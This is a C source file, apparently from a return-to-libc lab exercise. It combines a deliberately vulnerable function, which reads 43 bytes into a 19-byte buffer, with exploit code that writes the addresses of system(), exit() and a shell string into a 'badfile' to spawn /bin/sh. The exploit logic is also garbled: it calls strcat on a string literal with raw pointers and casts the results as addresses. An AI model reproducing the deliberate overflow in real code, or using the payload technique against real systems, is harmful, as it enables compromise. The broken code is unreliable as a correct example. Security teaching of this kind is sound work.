/* vulnerable2.c */
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <dlfcn.h> 


/*reads the data from badfile and stores in the buffer.*/
int func(FILE *input) {
	char buffer[19];
	fread(buffer, sizeof(char), 43, input);
	return 1;
}
int main(int argc, char *argv[]) {

	/*retreive shell address*/
	char *shell  = getenv("MYSHELL");
	if(shell){
		printf("%x\n", (unsigned int)shell);
	}


	/*exploit.c data to create a badfile and append address of system, exit and MYSHELL.*/
	char buf[43]; 
	memset(buf,'A', 43);
	FILE *output;
	output = fopen("./badfile", "w");


	void *h, *p,*q;

	h=dlopen(NULL,RTLD_LAZY);
	p=dlsym(h,"system");
	q=dlsym(h,"exit");
	printf("0x%08x\n",p);
	printf("0x%08x\n",q);

	*(long *) &buf[31] = strcat("0x",p); // system() 
	*(long *) &buf[35] = strcat("0x",q); // exit() 
	*(long *) &buf[39] = strcat("0x",shell); // "/bin/sh"

	fwrite(buf, sizeof(buf), 1, output); 
	fclose(output);
	

	/*vulnerable.c to read the badfile and return.*/
	FILE *input;
	input= fopen("badfile", "r");
	func(input);
	printf("Success\n");
	fclose(input);
	return 1;
}
